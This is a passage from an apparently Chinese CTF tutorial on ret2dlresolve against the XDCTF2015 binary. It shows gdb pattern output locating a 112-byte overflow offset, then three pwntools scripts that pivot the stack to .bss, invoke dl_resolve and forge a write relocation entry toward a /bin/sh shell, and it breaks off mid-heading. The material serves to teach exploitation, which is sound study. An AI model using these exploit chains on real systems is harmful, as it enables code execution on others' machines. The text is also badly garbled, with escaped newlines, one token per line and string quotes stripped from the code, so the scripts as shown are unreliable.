\uff0c\u6df1\u5165\u6d45\u51fa\u3002\n\n\nhttps://www.math1as.com/index.php/archives/341/\n\n\n\n\n\u9996\u5148\u6211\u4eec\u53ef\u4ee5\u7f16\u8bd1\u4e0bret2dlresolve\u6587\u4ef6\u5939\u4e0b\u7684\u6e90\u6587\u4ef6main.c\u6587\u4ef6\u5f97\u5230\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u8fd9\u91cc\u53d6\u6d88\u4e86Canary\u4fdd\u62a4\u3002\n\n\n\u279c  ret2dlresolve git:\n(\nmaster\n)\n \u2717 gcc main.c -m32 -fno-stack-protector -o main\n\n\n\n\n\u5728\u4e0b\u9762\u7684\u8bb2\u89e3\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4f1a\u6309\u7167\u4ee5\u4e24\u79cd\u4e0d\u540c\u7684\u65b9\u6cd5\u6765\u8fdb\u884c\u8bb2\u89e3\u3002\u5176\u4e2d\u7b2c\u4e00\u79cd\u65b9\u6cd5\u6bd4\u8f83\u9ebb\u70e6\uff0c\u4f46\u662f\u53ef\u4ee5\u4ed4\u7ec6\u7406\u89e3ret2dlresolve\u7684\u539f\u7406\uff0c\u7b2c\u4e8c\u79cd\u65b9\u6cd5\u5219\u662f\u76f4\u63a5\u4f7f\u7528\u5df2\u6709\u7684\u5de5\u5177\uff0c\u76f8\u5bf9\u5bb9\u6613\u4e00\u70b9\u3002\n\n\n\n\n\u5229\u7528\u6b63\u5e38\u7684\u4ee3\u7801\u6765\u4f7f\u7528\u8be5\u6280\u5de7\u4ece\u800c\u83b7\u53d6shell\u3002\n\n\nstage 1 \u6d4b\u8bd5\u63a7\u5236\u7a0b\u5e8f\u6267\u884cwrite\u51fd\u6570\u7684\u6548\u679c\u3002\n\n\nstage 2 \u6d4b\u8bd5\u63a7\u5236\u7a0b\u5e8f\u6267\u884cdl_resolve\u51fd\u6570\uff0c\u5e76\u4e14\u76f8\u5e94\u53c2\u6570\u6307\u5411\u6b63\u5e38write\u51fd\u6570\u7684plt\u65f6\u7684\u6267\u884c\u6548\u679c\u3002\n\n\nstage 3 \u6d4b\u8bd5\u63a7\u5236\u7a0b\u5e8f\u6267\u884cdl_resolve\u51fd\u6570\uff0c\u5e76\u4e14\u76f8\u5e94\u53c2\u6570\u6307\u5411\u4f2a\u9020\u7684write\u51fd\u6570\u7684plt\u65f6\u7684\u6267\u884c\u6548\u679c\u3002\n\n\n\n\n\n\n\u5229\u7528roputils\u4e2d\u5df2\u7ecf\u96c6\u6210\u597d\u7684\u5de5\u5177\u6765\u5b9e\u73b0\u653b\u51fb\uff0c\u4ece\u800c\u83b7\u53d6shell\u3002\n\n\n\n\n\u6b63\u5e38\u653b\u51fb\n\n\n\u663e\u7136\u6211\u4eec\u7a0b\u5e8f\u6709\u4e00\u4e2a\u5f88\u660e\u663e\u7684\u6808\u6ea2\u51fa\u6f0f\u6d1e\u7684\u3002\u8fd9\u9898\u6211\u4eec\u4e0d\u8003\u8651\u6211\u4eec\u6709libc\u7684\u60c5\u51b5\u3002\u6211\u4eec\u53ef\u4ee5\u5f88\u5bb9\u6613\u7684\u5206\u6790\u51fa\u504f\u79fb\u4e3a112\u3002\n\n\ngef\n\u27a4\n  \npattern\n \ncreate\n \n200\n\n\n[+]\n \nGenerating\n \na\n \npattern\n \nof\n \n200\n \nbytes\n\n\naaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n\n\n[+]\n \nSaved\n \nas\n \n$_gef0\n\n\ngef\n\u27a4\n  \nr\n\n\nStarting\n \nprogram\n:\n \n/\nmnt\n/\nhgfs\n/\nHack\n/\nctf\n/\nctf-wiki\n/\npwn\n/\nstackoverflow\n/\nexample\n/\nret2dlresolve\n/\nmain\n \n\nWelcome\n \nto\n \nXDCTF2015\n~\n!\n\n\naaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n\n\n\nProgram\n \nreceived\n \nsignal\n \nSIGSEGV\n,\n \nSegmentation\n \nfault.\n\n\n0\nx62616164\n \nin\n \n??\n \n()\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \nregisters\n \n]\n\u2500\u2500\u2500\u2500\n\n\n$eax\n   \n:\n \n0x000000c9\n\n\n$ebx\n   \n:\n \n0x00000000\n\n\n$ecx\n   \n:\n \n0xffffcc6c\n  \n\u2192\n  \naaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama\n[...]\n\n\n$edx\n   \n:\n \n0x00000100\n\n\n$esp\n   \n:\n \n0xffffcce0\n  \n\u2192\n  \neaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa\n[...]\n\n\n$ebp\n   \n:\n \n0x62616163\n \n(\ncaab\n?\n)\n\n\n$esi\n   \n:\n \n0xf7fac000\n  \n\u2192\n  \n0x001b1db0\n\n\n$edi\n   \n:\n \n0xffffcd50\n  \n\u2192\n  \n0xffffcd70\n  \n\u2192\n  \n0x00000001\n\n\n$eip\n   \n:\n \n0x62616164\n \n(\ndaab\n?\n)\n\n\n$cs\n    \n:\n \n0x00000023\n\n\n$ss\n    \n:\n \n0x0000002b\n\n\n$ds\n    \n:\n \n0x0000002b\n\n\n$es\n    \n:\n \n0x0000002b\n\n\n$fs\n    \n:\n \n0x00000000\n\n\n$gs\n    \n:\n \n0x00000063\n\n\n$eflags:\n \n[\ncarry\n \nPARITY\n \nadjust\n \nzero\n \nSIGN\n \ntrap\n \nINTERRUPT\n \ndirection\n \noverflow\n \nRESUME\n \nvirtualx86\n \nidentification\n]\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \ncode:\ni386\n \n]\n\u2500\u2500\u2500\u2500\n\n\n[!]\n \nCannot\n \ndisassemble\n \nfrom\n \n$PC\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \nstack\n \n]\n\u2500\u2500\u2500\u2500\n\n\n[\n0\nxffffcce0\n,\n \nl8\n]\n\n\n8\n\n\n0\nxffffcce0\n\u2502+\n0x00\n:\n \neaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa\n[...]\n  \n\u2190\n \n$esp\n\n\n0\nxffffcce4\n\u2502+\n0x04\n:\n \nfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabra\n[...]\n\n\n0\nxffffcce8\n\u2502+\n0x08\n:\n \ngaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsa\n[...]\n\n\n0\nxffffccec\n\u2502+\n0x0c\n:\n \nhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabta\n[...]\n\n\n0\nxffffccf0\n\u2502+\n0x10\n:\n \niaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabua\n[...]\n\n\n0\nxffffccf4\n\u2502+\n0x14\n:\n \njaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabva\n[...]\n\n\n0\nxffffccf8\n\u2502+\n0x18\n:\n \nkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwa\n[...]\n\n\n0\nxffffccfc\n\u2502+\n0x1c\n:\n \nlaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxa\n[...]\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[\n \ntrace\n \n]\n\u2500\u2500\u2500\u2500\n\n\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n\ngef\n\u27a4\n  \npattern\n \nsearch\n \n\n[!]\n \nSyntax\n\n\npattern\n \nsearch\n \nPATTERN\n \n[\nSIZE\n]\n\n\ngef\n\u27a4\n  \npattern\n \nsearch\n \n0x62616164\n\n\n[+]\n \nSearching\n \n0x62616164\n\n\n[+]\n \nFound\n \nat\n \noffset\n \n112\n \n(\nlittle-endian\n \nsearch\n)\n \nlikely\n\n\n\n\n\nstage 1\n\n\n\u8fd9\u91cc\u6211\u4eec\u7684\u4e3b\u8981\u76ee\u7684\u662f\u63a7\u5236\u7a0b\u5e8f\u6267\u884cwrite\u51fd\u6570\uff0c\u867d\u7136\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u7a0b\u5e8f\u76f4\u63a5\u6267\u884cwrite\u51fd\u6570\u3002\u4f46\u662f\u8fd9\u91cc\u6211\u4eec\u91c7\u7528\u4e00\u4e2a\u66f4\u52a0\u590d\u6742\u7684\u529e\u6cd5\uff0c\u5373\u4f7f\u7528\u6808\u8fc1\u79fb\u7684\u6280\u5de7\uff0c\u5c06\u6808\u8fc1\u79fb\u5230bss\u6bb5\u6765\u63a7\u5236write\u51fd\u6570\u3002\u5373\u4e3b\u8981\u5206\u4e3a\u4e24\u6b65\n\n\n\n\n\u5c06\u6808\u8fc1\u79fb\u5230bss\u6bb5\u3002\n\n\n\u63a7\u5236write\u51fd\u6570\u8f93\u51fa\u76f8\u5e94\u5b57\u7b26\u4e32\u3002\n\n\n\n\n\u8fd9\u91cc\u4e3b\u8981\u4f7f\u7528\u4e86pwntools\u4e2d\u7684ROP\u6a21\u5757\u3002\u5177\u4f53\u4ee3\u7801\u5982\u4e0b\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\nelf\n \n=\n \nELF\n(\nmain\n)\n\n\nr\n \n=\n \nprocess\n(\n./main\n)\n\n\nrop\n \n=\n \nROP\n(\n./main\n)\n\n\n\noffset\n \n=\n \n112\n\n\nbss_addr\n \n=\n \nelf\n.\nbss\n()\n\n\n\nr\n.\nrecvuntil\n(\nWelcome to XDCTF2015~!\n\\n\n)\n\n\n\n## stack privot to bss segment\n\n\n## new stack size is 0x800\n\n\nstack_size\n \n=\n \n0x800\n\n\nbase_stage\n \n=\n \nbss_addr\n \n+\n \nstack_size\n\n\n### padding\n\n\nrop\n.\nraw\n(\na\n \n*\n \noffset\n)\n\n\n### read 100 byte to base_stage\n\n\nrop\n.\nread\n(\n0\n,\n \nbase_stage\n,\n \n100\n)\n\n\n### stack privot, set esp = base_stage\n\n\nrop\n.\nmigrate\n(\nbase_stage\n)\n\n\nr\n.\nsendline\n(\nrop\n.\nchain\n())\n\n\n\n## write cmd=\n/bin/sh\n\n\nrop\n \n=\n \nROP\n(\n./main\n)\n\n\nsh\n \n=\n \n/bin/sh\n\n\nrop\n.\nwrite\n(\n1\n,\n \nbase_stage\n \n+\n \n80\n,\n \nlen\n(\nsh\n))\n\n\nrop\n.\nraw\n(\na\n \n*\n \n(\n80\n \n-\n \nlen\n(\nrop\n.\nchain\n())))\n\n\nrop\n.\nraw\n(\nsh\n)\n\n\nrop\n.\nraw\n(\na\n \n*\n \n(\n100\n \n-\n \nlen\n(\nrop\n.\nchain\n())))\n\n\n\nr\n.\nsendline\n(\nrop\n.\nchain\n())\n\n\nr\n.\ninteractive\n()\n\n\n\n\n\n\u7ed3\u679c\u5982\u4e0b\n\n\n\u279c  ret2dlresolve git:\n(\nmaster\n)\n \u2717 python stage1.py\n\n[\n*\n]\n \n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main\n\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x8048000\n)\n\n\n[\n+\n]\n Starting \nlocal\n process \n./main\n: pid \n120912\n\n\n[\n*\n]\n Loaded cached gadgets \nfor\n \n./main\n\n\n[\n*\n]\n Switching to interactive mode\n/bin/sh\n[\n*\n]\n Got EOF \nwhile\n reading in interactive\n\n\n\n\nstage 2\n\n\n\u5728\u8fd9\u4e00\u9636\u6bb5\uff0c\u6211\u4eec\u5c06\u4f1a\u5229\u7528dlresolve\u76f8\u5173\u7684\u77e5\u8bc6\u6765\u63a7\u5236\u7a0b\u5e8f\u6267\u884cwrite\u51fd\u6570\u3002\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u662f\u5229\u7528plt[0]\u4e2d\u7684\u76f8\u5173\u6307\u4ee4\uff0c\u5373push linkmap\u4ee5\u53ca\u8df3\u8f6c\u5230dl_resolve\u51fd\u6570\u4e2d\u89e3\u6790\u7684\u6307\u4ee4\u3002\u6b64\u5916\uff0c\u6211\u4eec\u8fd8\u5f97\u5355\u72ec\u63d0\u4f9b\u4e00\u4e2awrite\u91cd\u5b9a\u4f4d\u9879\u5728plt\u8868\u4e2d\u7684\u504f\u79fb\u3002\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\nelf\n \n=\n \nELF\n(\nmain\n)\n\n\nr\n \n=\n \nprocess\n(\n./main\n)\n\n\nrop\n \n=\n \nROP\n(\n./main\n)\n\n\n\noffset\n \n=\n \n112\n\n\nbss_addr\n \n=\n \nelf\n.\nbss\n()\n\n\n\nr\n.\nrecvuntil\n(\nWelcome to XDCTF2015~!\n\\n\n)\n\n\n\n## stack privot to bss segment\n\n\n## new stack size is 0x800\n\n\nstack_size\n \n=\n \n0x800\n\n\nbase_stage\n \n=\n \nbss_addr\n \n+\n \nstack_size\n\n\n### padding\n\n\nrop\n.\nraw\n(\na\n \n*\n \noffset\n)\n\n\n### read 100 byte to base_stage\n\n\nrop\n.\nread\n(\n0\n,\n \nbase_stage\n,\n \n100\n)\n\n\n### stack privot, set esp = base_stage\n\n\nrop\n.\nmigrate\n(\nbase_stage\n)\n\n\nr\n.\nsendline\n(\nrop\n.\nchain\n())\n\n\n\n## write cmd=\n/bin/sh\n\n\nrop\n \n=\n \nROP\n(\n./main\n)\n\n\nsh\n \n=\n \n/bin/sh\n\n\n\nplt0\n \n=\n \nelf\n.\nget_section_by_name\n(\n.plt\n)\n.\nheader\n.\nsh_addr\n\n\nwrite_index\n \n=\n \n(\nelf\n.\nplt\n[\nwrite\n]\n \n-\n \nplt0\n)\n \n/\n \n16\n \n-\n \n1\n\n\nwrite_index\n \n*=\n \n8\n\n\nrop\n.\nraw\n(\nplt0\n)\n\n\nrop\n.\nraw\n(\nwrite_index\n)\n\n\n## fake ret addr of write\n\n\nrop\n.\nraw\n(\nbbbb\n)\n\n\nrop\n.\nraw\n(\n1\n)\n\n\nrop\n.\nraw\n(\nbase_stage\n \n+\n \n80\n)\n\n\nrop\n.\nraw\n(\nlen\n(\nsh\n))\n\n\nrop\n.\nraw\n(\na\n \n*\n \n(\n80\n \n-\n \nlen\n(\nrop\n.\nchain\n())))\n\n\nrop\n.\nraw\n(\nsh\n)\n\n\nrop\n.\nraw\n(\na\n \n*\n \n(\n100\n \n-\n \nlen\n(\nrop\n.\nchain\n())))\n\n\n\nr\n.\nsendline\n(\nrop\n.\nchain\n())\n\n\nr\n.\ninteractive\n()\n\n\n\n\n\n\u6548\u679c\u5982\u4e0b\uff0c\u4ecd\u7136\u8f93\u51fa\u4e86cmd\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u3002\n\n\n\u279c  ret2dlresolve git:\n(\nmaster\n)\n \u2717 python stage2.py\n\n[\n*\n]\n \n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main\n\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x8048000\n)\n\n\n[\n+\n]\n Starting \nlocal\n process \n./main\n: pid \n123406\n\n\n[\n*\n]\n Loaded cached gadgets \nfor\n \n./main\n\n\n[\n*\n]\n Switching to interactive mode\n/bin/sh\n[\n*\n]\n Got EOF \nwhile\n reading in interactive\n\n\n\n\nstage 3\n\n\n\u8fd9\u4e00\u6b21\uff0c\u6211\u4eec\u540c\u6837\u63a7\u5236dl_resolve\u51fd\u6570\u4e2d\u7684index_offset\u53c2\u6570\uff0c\u4e0d\u8fc7\u8fd9\u6b21\u63a7\u5236\u5176\u6307\u5411\u6211\u4eec\u4f2a\u9020\u7684write\u91cd\u5b9a\u4f4d\u9879\u3002\n\n\n\u9274\u4e8epwntools\u672c\u8eab\u5e76\u4e0d\u652f\u6301\u5bf9\u91cd\u5b9a\u4f4d\u8868\u9879\u7684\u4fe1\u606f\u7684\u83b7\u53d6\u3002\u8fd9\u91cc\u6211\u4eec\u624b\u52a8\u770b\u4e00\u4e0b\n\n\n\u279c  ret2dlresolve git:\n(\nmaster\n)\n \u2717 readelf -r main  \n\n\u91cd\u5b9a\u4f4d\u8282 \n.rel.dyn\n \u4f4d\u4e8e\u504f\u79fb\u91cf 0x318 \u542b\u6709 \n3\n \u4e2a\u6761\u76ee\uff1a\n \u504f\u79fb\u91cf     \u4fe1\u606f    \u7c7b\u578b              \u7b26\u53f7\u503c      \u7b26\u53f7\u540d\u79f0\n08049ffc  \n00000306\n R_386_GLOB_DAT    \n00000000\n   __gmon_start__\n0804a040  \n00000905\n R_386_COPY        0804a040   stdin@GLIBC_2.0\n0804a044  \n00000705\n R_386_COPY        0804a044   stdout@GLIBC_2.0\n\n\u91cd\u5b9a\u4f4d\u8282 \n.rel.plt\n \u4f4d\u4e8e\u504f\u79fb\u91cf 0x330 \u542b\u6709 \n5\n \u4e2a\u6761\u76ee\uff1a\n \u504f\u79fb\u91cf     \u4fe1\u606f    \u7c7b\u578b              \u7b26\u53f7\u503c      \u7b26\u53f7\u540d\u79f0\n0804a00c  \n00000107\n R_386_JUMP_SLOT   \n00000000\n   setbuf@GLIBC_2.0\n0804a010  \n00000207\n R_386_JUMP_SLOT   \n00000000\n   read@GLIBC_2.0\n0804a014  \n00000407\n R_386_JUMP_SLOT   \n00000000\n   strlen@GLIBC_2.0\n0804a018  \n00000507\n R_386_JUMP_SLOT   \n00000000\n   __libc_start_main@GLIBC_2.0\n0804a01c  \n00000607\n R_386_JUMP_SLOT   \n00000000\n   write@GLIBC_2.0\n\n\n\n\n\u53ef\u4ee5\u770b\u51fawrite\u7684\u91cd\u5b9a\u8868\u9879\u7684r_offset=0x0804a01c\uff0cr_info=0x00000607\u3002\u5177\u4f53\u4ee3\u7801\u5982\u4e0b\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\nelf\n \n=\n \nELF\n(\nmain\n)\n\n\nr\n \n=\n \nprocess\n(\n./main\n)\n\n\nrop\n \n=\n \nROP\n(\n./main\n)\n\n\n\noffset\n \n=\n \n112\n\n\nbss_addr\n \n=\n \nelf\n.\nbss\n()\n\n\n\nr\n.\nrecvuntil\n(\nWelcome to XDCTF2015~!\n\\n\n)\n\n\n\n## stack privot to bss segment\n\n\n## new stack size is 0x800\n\n\nstack_size\n \n=\n \n0x800\n\n\nbase_stage\n \n=\n \nbss_addr\n \n+\n \nstack_size\n\n\n### padding\n\n\nrop\n.\nraw\n(\na\n \n*\n \noffset\n)\n\n\n### read 100 byte to base_stage\n\n\nrop\n.\nread\n(\n0\n,\n \nbase_stage\n,\n \n100\n)\n\n\n### stack privot, set esp = base_stage\n\n\nrop\n.\nmigrate\n(\nbase_stage\n)\n\n\nr\n.\nsendline\n(\nrop\n.\nchain\n())\n\n\n\n## write sh=\n/bin/sh\n\n\nrop\n \n=\n \nROP\n(\n./main\n)\n\n\nsh\n \n=\n \n/bin/sh\n\n\n\nplt0\n \n=\n \nelf\n.\nget_section_by_name\n(\n.plt\n)\n.\nheader\n.\nsh_addr\n\n\nrel_plt\n \n=\n \nelf\n.\nget_section_by_name\n(\n.rel.plt\n)\n.\nheader\n.\nsh_addr\n\n\n## making base_stage+24 ---\n fake reloc\n\n\nindex_offset\n \n=\n \nbase_stage\n \n+\n \n24\n \n-\n \nrel_plt\n\n\nwrite_got\n \n=\n \nelf\n.\ngot\n[\nwrite\n]\n\n\nr_info\n \n=\n \n0x607\n\n\n\nrop\n.\nraw\n(\nplt0\n)\n\n\nrop\n.\nraw\n(\nindex_offset\n)\n\n\n## fake ret addr of write\n\n\nrop\n.\nraw\n(\nbbbb\n)\n\n\nrop\n.\nraw\n(\n1\n)\n\n\nrop\n.\nraw\n(\nbase_stage\n \n+\n \n80\n)\n\n\nrop\n.\nraw\n(\nlen\n(\nsh\n))\n\n\nrop\n.\nraw\n(\nwrite_got\n)\n  \n# fake reloc\n\n\nrop\n.\nraw\n(\nr_info\n)\n\n\nrop\n.\nraw\n(\na\n \n*\n \n(\n80\n \n-\n \nlen\n(\nrop\n.\nchain\n())))\n\n\nrop\n.\nraw\n(\nsh\n)\n\n\nrop\n.\nraw\n(\na\n \n*\n \n(\n100\n \n-\n \nlen\n(\nrop\n.\nchain\n())))\n\n\n\nr\n.\nsendline\n(\nrop\n.\nchain\n())\n\n\nr\n.\ninteractive\n()\n\n\n\n\n\n\u6700\u540e\u7ed3\u679c\u5982\u4e0b\uff0c\u8fd9\u6b21\u6211\u4eec\u5728bss\u6bb5\u4f2a\u9020\u4e86\u4e00\u4e2a\u5047\u7684write\u7684\u91cd\u5b9a\u4f4d\u9879\uff0c\u4ecd\u7136\u8f93\u51fa\u4e86\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u3002\n\n\n\u279c  ret2dlresolve git:\n(\nmaster\n)\n \u2717 python stage3.py\n\n[\n*\n]\n \n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main\n\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x8048000\n)\n\n\n[\n+\n]\n Starting \nlocal\n process \n./main\n: pid \n126063\n\n\n[\n*\n]\n Loaded cached gadgets \nfor\n \n./main\n\n\n[\n*\n]\n Switching to interactive mode\n/bin/sh\n[\n*\n]\n Got EOF \nwhile\n reading in interactive\n\n\n\n\nstage 